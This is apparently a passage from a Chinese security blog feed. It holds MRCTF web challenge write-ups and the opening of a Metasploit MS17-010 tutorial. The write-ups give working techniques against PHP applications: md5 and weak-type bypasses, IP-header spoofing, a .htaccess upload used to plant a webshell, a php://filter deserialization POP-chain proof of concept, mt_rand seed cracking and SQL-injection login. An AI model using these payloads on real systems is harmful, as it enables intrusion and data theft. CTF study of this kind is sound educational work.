class="comment">#print(finallen)</span></span><br><span class="line">        <span class="keyword">if</span> finallen==normallen:</span><br><span class="line">            database+=chr(j)</span><br><span class="line">            print(database)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/MRCTF&WUST-CTF/12.png" alt></p>
<h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><p>进去后查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>有两个点需要绕过<code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code>和<code>!is_numeric($passwd)</code><br>第一个为<code>===</code>可以通过数组绕过，第二个为弱类型，在弱类型中php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉，所以输入1234567+任意字符串就可以绕过了<br><img src="/2020/03/30/MRCTF&WUST-CTF/1.png" alt></p>
<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>这个进去后要求输入授权码，然后扫描目录发现了flag.php，提示ip问题，修改一下xxf为127.0.0.1然后查看源码发现了flag</p>
<h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>这个多测试几次便发现.htaccess文件可以上传，上传一个.htaccess内容 SetHandler application/x-httpd-php 这样所有文件都会解析为php。但是由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式生成</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> SetHandler application/x-httpd-php  &gt; <span class="string">.htaccess</span></span><br></pre></td></tr></table></figure>

<p>上传之后再上传写有木马的txt文件，txt文件也可被解析。</p>
<h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>进入后什么都没有，查看源码发现提示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>

<p>这里过滤了<code>_和%5f</code>，但是传参又必须要<code>_</code>，所以要想办法绕过，百度后发现<a href="https://www.jianshu.com/p/c972b51318e9" target="_blank" rel="noopener">2019 NJUPT CTF</a>中有差不多的绕过方法，就是php会把空格或者点（.）自动替换成下划线。我们也可以使用大小写和空格来绕过。<br>后面的正则表达式可以通过%0a绕过<code>?b.u.p.t=23333%0a</code></p>
<p>绕过后得到一个目录，访问，显示ip不对，通过Client-Ip伪造，然后再源码发现了JSFUCK，直接复制到控制台回车，解密后提示通过post传入Merak，<img src="/2020/03/30/MRCTF&WUST-CTF/9.png" alt>然后便获得了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里ip已经满足了，还要通过2333传入一个字符串’todat is a happy day’，后面通过file读取文件，但是传入的参数经过了change函数加密，我们需要写一个脚本反加密，这样经过change加密后便成为了我们要读的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">	$re = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord($v[$i]) - $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">echo</span> base64_encode($re).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line">$a = dechange(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> change(base64_encode($a));			<span class="comment">#ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/MRCTF&WUST-CTF/10.png" alt><br>然后依次传参后查看源码就得到flag</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/secrettw.php?2333=data:/</span><span class="regexp">/text/</span>plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;<span class="keyword">file</span>=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/MRCTF&WUST-CTF/11.png" alt></p>
<h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫描目录发现源码<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>这里主要是要比较这个私钥，题目给了公钥，可以发现他们都是<code>mt_rand()</code>生成的。所以只要用公钥去还原种子，然后再手工算出私钥即可<br>脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"KVQP0LdJKRaV3n9D"</span>;</span><br><span class="line">$randStr = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *爆破得到mt_srand = 1775196155</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">  $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  $public_key = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 先生成一次公钥在生成一次密钥  XuNhoueCDCGc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">  $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  $private_key = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/MRCTF&WUST-CTF/7.png" alt><br>将<code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</code>拿去爆破得到<code>1775196155</code>再用其去生成密钥<br><img src="/2020/03/30/MRCTF&WUST-CTF/8.png" alt>然后使用万能密码登陆就拿到flag了</p>
<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>进去之后得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;		<span class="comment">#当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;	<span class="comment">#当一个类的实例对象；被当成一个字符串输出时调用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;		<span class="comment">#反序列化的时候调用</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;	<span class="comment">#具有构造函数的类会在每次创建新对象时先调用此方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;  <span class="comment">#读取不可访问的属性值是自动调用</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一些PHP类属性：</p>
<blockquote>
<ul>
<li>public：默认值，表示全局的，类内部外部子类都可以访问。</li>
<li>protected：表示受保护的，只有本类或子类或父类中可以访问，不允许外部调用。</li>
<li>private：表示私有的，只有本类内部可以使用。</li>
</ul>
</blockquote>
<ol>
<li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li>
<li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li>
<li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li>
<li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li>
</ol>
<p>整个流程为:<br>我们可以使用__invoke()方法去包含$var，然后使用伪协议去读取flag.php。而调用其的条件为<code>当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</code>,恰好Test类里面的__get()方法满足条件。<br>调用__get()的条件为<code>读取不可访问的属性值是自动调用</code>,这是我们可以使用__tostring()方法，当str赋值为一个其他类的时候，因为类中没有source属性，就会触发__get()方法。__wakeup()<code>方法通过</code>preg_match()<code>将</code>$this-&gt;source<code>做字符串比较，如果</code>$this-&gt;source<code>是</code>Show<code>类，就调用了</code>__toString()`方法；<br>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var = <span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"asd"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Show(<span class="string">'aaa'</span>);</span><br><span class="line">$o-&gt;str= <span class="keyword">new</span> Test();</span><br><span class="line">$c = <span class="keyword">new</span> Show($o);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>GET传参，解码后为flag<br> <img src="/2020/03/30/MRCTF&WUST-CTF/13.png" alt></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit--永恒之蓝</title>
    <url>/2020/03/01/MS17-010/</url>
    <content><![CDATA[<h1 id="Metasploit框架介绍"><a href="#Metasploit框架介绍" class="headerlink" title="Metasploit框架介绍"></a>Metasploit框架介绍</h1><h2 id="Metasploit-MSF-简介"><a href="#Metasploit-MSF-简介" class="headerlink" title="Metasploit(MSF)简介"></a>Metasploit(MSF)简介</h2><p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。我们能够通过它发现漏洞并进行快速实施攻击<a id="more"></a></p>
<h2 id="综合渗透测试框架"><a href="#综合渗透测试框架" class="headerlink" title="综合渗透测试框架"></a>综合渗透测试框架</h2><p>Auxiliary   辅助模块    为渗透测试信息搜集提供了大量的辅助模块支持<br>Exploits  攻击模块    利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
<p>Payload  攻击载荷模块     攻击成功后促使靶机运行的一段植入代码<br>Post  后渗透攻击模块  收集更多信息或进一步访问被利用的目标系统<br>Encoders     编码模块        将攻击载荷进行编码，来绕过防护软件拦截</p>
<h1 id="简单好用的帮助指令"><a href="#简单好用的帮助指令" class="headerlink" title="简单好用的帮助指令"></a>简单好用的帮助指令</h1><p>help/?         帮助菜单<br>exit  退出MSF控制台<br>Back         返回上一级<br>info  显示一个或者多个模块的信息<br>show  显示所给类型的模块<br>background   将当前操作在后台运行<br>use   使用所选择的模块<br>set  设置选项<br>unset  取消设置的选项 </p>
<h2 id="更新msf"><a href="#更新msf" class="headerlink" title="更新msf"></a>更新msf</h2><p>\1. 查看当前的系统中所有软件包状态</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo dpkg <span class="comment">--get-selections | more</span></span><br></pre></td></tr></table></figure>

<p>可以找到metasploit-framework软件包名为“metasploit-framework”</p>
<p>\2. 给metasploit-framework锁定当前版本不更新</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="selector-tag">mark</span> hold metasploit-framework</span><br></pre></td></tr></table></figure>

<p>\3. 查看当前己锁定的软件包：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sudo</span> dpkg --<span class="meta">get</span>-<span class="keyword">selections </span><span class="title">| grep hold</span></span><br></pre></td></tr></table></figure>

<p> 4.取消软件保留设置</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="selector-tag">mark</span> unhold metasploit-framework</span><br></pre></td></tr></table></figure>

<p>kali系统更新后出现的问题</p>
<p>进入/usr/share/metasploit-framework目录下</p>
<p>使用命令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">gem <span class="keyword">install</span> bundler</span><br><span class="line">gem <span class="keyword">update</span> <span class="comment">--system</span></span><br></pre></td></tr></table></figure>

<p>然后成功启动</p>
<h1 id="MSF实践："><a href="#MSF实践：" class="headerlink" title="MSF实践："></a>MSF实践：</h1><p>开启数据库：service postgresql start<br>初始化msf数据库:msfdb init<br>开启MSF:msfconsole</p>
<p><img src="/2020/03/01/MS17-010/1.gif" alt="clipboard.png"></p>
<p>查看数据连接状态:db_status</p>
<p><img src="/2020/03/01/MS17-010/2.gif" alt="clipboard.png"></p>
<p>Auxiliary 模块:   show auxiliary</p>
<p><img src="/2020/03/01/MS17-010/3.gif" alt="clipboard.png"></p>
<p>命名规则:功能/服务/名称         scanner/smb/smb_ms17_010</p>
